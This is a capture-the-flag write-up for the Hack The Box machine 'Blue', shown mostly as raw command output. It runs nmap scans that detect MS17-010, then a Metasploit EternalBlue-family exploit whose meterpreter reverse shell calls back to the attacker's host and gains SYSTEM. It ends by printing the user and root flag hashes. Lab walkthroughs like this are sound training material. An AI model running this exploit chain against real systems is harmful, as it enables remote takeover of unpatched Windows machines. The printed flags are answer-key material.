# blue: https://app.hackthebox.com/machines/Blue

```bash
nmap -sC -sV 10.10.10.40               
Nmap scan report for 10.10.10.40
Host is up (0.082s latency).
Not shown: 991 closed tcp ports (conn-refused)
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   210: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2023-04-02T14:04:19
|_  start_date: 2023-04-02T14:02:36
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: haris-PC
|   NetBIOS computer name: HARIS-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2023-04-02T15:04:17+01:00
|_clock-skew: mean: -19m56s, deviation: 34m37s, median: 1s

```

```bash
nmap -p 139,445 -Pn --script=smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-ms17-010.nse 10.10.10.40

PORT    STATE SERVICE      REASON
139/tcp open  netbios-ssn  syn-ack
445/tcp open  microsoft-ds syn-ack

Host script results:
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: NT_STATUS_OBJECT_NAME_NOT_FOUND
```

```bash
msf6 > search ms17-010

Matching Modules
================

   #  Name                                      Disclosure Date  Rank     Check  Description
   -  ----                                      ---------------  ----     -----  -----------
   0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   2  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   3  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection
   4  exploit/windows/smb/smb_doublepulsar_rce  2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution

Interact with a module by name or index. For example info 4, use 4 or use exploit/windows/smb/smb_doublepulsar_rce

msf6 > use 1
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_psexec) > set RHOST 10.10.10.40
RHOST => 10.10.10.40
msf6 exploit(windows/smb/ms17_010_psexec) > set LHOST 10.10.14.4
LHOST => 10.10.14.4
msf6 exploit(windows/smb/ms17_010_psexec) > show options 

Module options (exploit/windows/smb/ms17_010_psexec):

   Name                  Current Setting                     Required  Description
   ----                  ---------------                     --------  -----------
   DBGTRACE              false                               yes       Show extra debug trace info
   LEAKATTEMPTS          99                                  yes       How many times to try to leak transaction
   NAMEDPIPE                                                 no        A named pipe that can be connected to (leave blank for auto)
   NAMED_PIPES           /usr/share/metasploit-framework/da  yes       List of named pipes to check
                         ta/wordlists/named_pipes.txt
   RHOSTS                10.10.10.40                         yes       The target host(s), see https://docs.metasploit.com/docs/using
                                                                       -metasploit/basics/using-metasploit.html
   RPORT                 445                                 yes       The Target port (TCP)
   SERVICE_DESCRIPTION                                       no        Service description to to be used on target for pretty listing
   SERVICE_DISPLAY_NAME                                      no        The service display name
   SERVICE_NAME                                              no        The service name
   SHARE                 ADMIN$                              yes       The share to connect to, can be an admin share (ADMIN$,C$,...)
                                                                        or a normal read/write folder share
   SMBDomain             .                                   no        The Windows domain to use for authentication
   SMBPass                                                   no        The password for the specified username
   SMBUser                                                   no        The username to authenticate as

Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.14.4       yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port

Exploit target:

   Id  Name
   --  ----
   0   Automatic

View the full module info with the info, or info -d command.

msf6 exploit(windows/smb/ms17_010_psexec) > run 

[*] Started reverse TCP handler on 10.10.14.4:4444 
[*] 10.10.10.40:445 - Target OS: Windows 7 Professional 7601 Service Pack 1
[*] 10.10.10.40:445 - Built a write-what-where primitive...
[+] 10.10.10.40:445 - Overwrite complete... SYSTEM session obtained!
[*] 10.10.10.40:445 - Selecting PowerShell target
[*] 10.10.10.40:445 - Executing the payload...
[+] 10.10.10.40:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (175686 bytes) to 10.10.10.40
[*] Meterpreter session 1 opened (10.10.14.4:4444 -> 10.10.10.40:49158) at 2023-04-02 10:07:34 -0400
```

```bash
meterpreter > shell
Process 2532 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>
```

```bash
C:\Users\haris\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is BE92-053B

 Directory of C:\Users\haris\Desktop

24/12/2017  03:23    <DIR>          .
24/12/2017  03:23    <DIR>          ..
02/04/2023  15:03                34 user.txt
               1 File(s)             34 bytes
               2 Dir(s)   2,427,396,096 bytes free

C:\Users\haris\Desktop>type user.txt
type user.txt
9f9719124cc8b528b61172b88ad05fbc
```

```bash
C:\Users\haris\Desktop>type user.txt
type user.txt
9f9719124cc8b528b61172b88ad05fbc

C:\Users\haris\Desktop>cd ..\..\Administrator\Desktop
cd ..\..\Administrator\Desktop

C:\Users\Administrator\Desktop>type root.txt
type root.txt
d513833b2f939927a89362e9d0b2f748
```
